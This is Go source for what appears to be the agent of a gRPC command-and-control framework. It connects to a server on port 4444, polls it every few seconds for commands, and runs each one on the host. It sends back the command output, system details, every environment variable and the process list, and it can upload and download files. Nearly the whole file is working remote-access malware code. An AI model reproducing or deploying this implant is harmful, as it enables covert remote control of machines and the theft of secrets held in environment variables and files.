package main

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/h3bzzz/C2SATurn/grpcapi"
	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.AgentClient
	)

	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewAgentClient(conn)

	ctx := context.Background()
	for {
		handleCommands(ctx, client)
		time.Sleep(3 * time.Second)
	}
}

func handleCommands(ctx context.Context, client grpcapi.AgentClient) {
	// Fetch command from the server
	req := &grpcapi.Empty{}
	cmd, err := client.FetchCommand(ctx, req)
	if err != nil {
		log.Println("Error fetching command:", err)
		return
	}
	if cmd.In == "" {
		// No work
		return
	}

	// Process the command
	switch strings.ToLower(cmd.In) {
	case "sysinfo":
		handleSysInfo(ctx, client)
	case "listprocesses":
		handleListProcesses(ctx, client)
	default:
		executeCommand(ctx, client, cmd)
	}
}

func executeCommand(ctx context.Context, client grpcapi.AgentClient, cmd *grpcapi.Command) {
	tokens := strings.Split(cmd.In, " ")
	var c *exec.Cmd
	if len(tokens) == 1 {
		c = exec.Command(tokens[0])
	} else {
		c = exec.Command(tokens[0], tokens[1:]...)
	}
	buf, err := c.CombinedOutput()
	if err != nil {
		cmd.Out = fmt.Sprintf("Error: %s\n", err.Error())
	}
	cmd.Out += string(buf)

	// Send the command output back to the server
	_, err = client.SendOutput(ctx, cmd)
	if err != nil {
		log.Println("Error sending output:", err)
	}
}

func handleSysInfo(ctx context.Context, client grpcapi.AgentClient) {
	hostname, _ := os.Hostname()
	osInfo := runtime.GOOS
	arch := runtime.GOARCH
	uptime, _ := exec.Command("uptime").Output()

	sysInfo := &grpcapi.SystemInfo{
		Hostname:             hostname,
		OS:                   osInfo,
		Architecture:         arch,
		Uptime:               string(uptime),
		EnvironmentVariables: map[string]string{},
	}
	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) == 2 {
			sysInfo.EnvironmentVariables[parts[0]] = parts[1]
		}
	}

	_, err := client.SendOutput(ctx, &grpcapi.Command{
		In:  "sysinfo",
		Out: fmt.Sprintf("%+v", sysInfo),
	})
	if err != nil {
		log.Println("Error sending system info:", err)
	}
}

func handleListProcesses(ctx context.Context, client grpcapi.AgentClient) {
	output, err := exec.Command("ps", "-eo", "pid,comm,user").Output()
	if err != nil {
		_, _ = client.SendOutput(ctx, &grpcapi.Command{
			In:  "listprocesses",
			Out: fmt.Sprintf("Error listing processes: %s", err.Error()),
		})
		return
	}

	_, err = client.SendOutput(ctx, &grpcapi.Command{
		In:  "listprocesses",
		Out: string(output),
	})
	if err != nil {
		log.Println("Error sending process list:", err)
	}
}

func uploadFile(ctx context.Context, client grpcapi.AgentClient, filePath string) {
	file, err := os.Open(filePath)
	if err != nil {
		log.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	buffer := make([]byte, 1024)
	for {
		n, err := file.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Println("Error reading file:", err)
			return
		}

		chunk := &grpcapi.FileChunk{
			Data:        buffer[:n],
			FileName:    filePath,
			ChunkNumber: int64(1), // Adjust for actual chunking
		}

		_, err = client.UploadFile(ctx, chunk)
		if err != nil {
			log.Println("Error uploading file chunk:", err)
			return
		}
	}
}

func downloadFile(ctx context.Context, client grpcapi.AgentClient, fileName string) {
	req := &grpcapi.FileRequest{FileName: fileName}
	stream, err := client.DownloadFile(ctx, req)
	if err != nil {
		log.Println("Error starting file download:", err)
		return
	}

	var buffer bytes.Buffer
	for {
		chunk, err := stream.Recv()
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Println("Error receiving file chunk:", err)
			return
		}
		buffer.Write(chunk.Data)
	}

	err = os.WriteFile(fileName, buffer.Bytes(), 0644)
	if err != nil {
		log.Println("Error saving file:", err)
	}
}
